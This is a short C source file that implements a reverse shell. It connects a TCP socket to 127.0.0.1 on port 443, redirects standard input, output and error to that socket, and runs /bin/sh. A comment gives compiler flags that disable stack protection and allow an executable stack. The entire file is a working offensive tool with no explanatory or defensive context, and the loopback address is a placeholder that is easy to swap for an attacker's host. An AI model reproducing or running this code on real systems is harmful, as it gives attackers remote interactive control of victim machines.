#include <unistd.h>
#include <arpa/inet.h>

int main() 
{
	// gcc -fno-stack-protector -z execstack revshell.c -o revshell
	struct sockaddr_in addr;
	addr.sin_family = AF_INET;
	addr.sin_port = htons(443);
	addr.sin_addr.s_addr = inet_addr("127.0.0.1");

	int sockfd = socket(AF_INET, SOCK_STREAM, 0);
	connect(sockfd, (struct sockaddr*)&addr, sizeof(addr));

	dup2(sockfd, 0);	// STDIN
	dup2(sockfd, 1);	// STDOUT
	dup2(sockfd, 2);	// STDERR

	execve("/bin/sh", NULL, NULL);
}
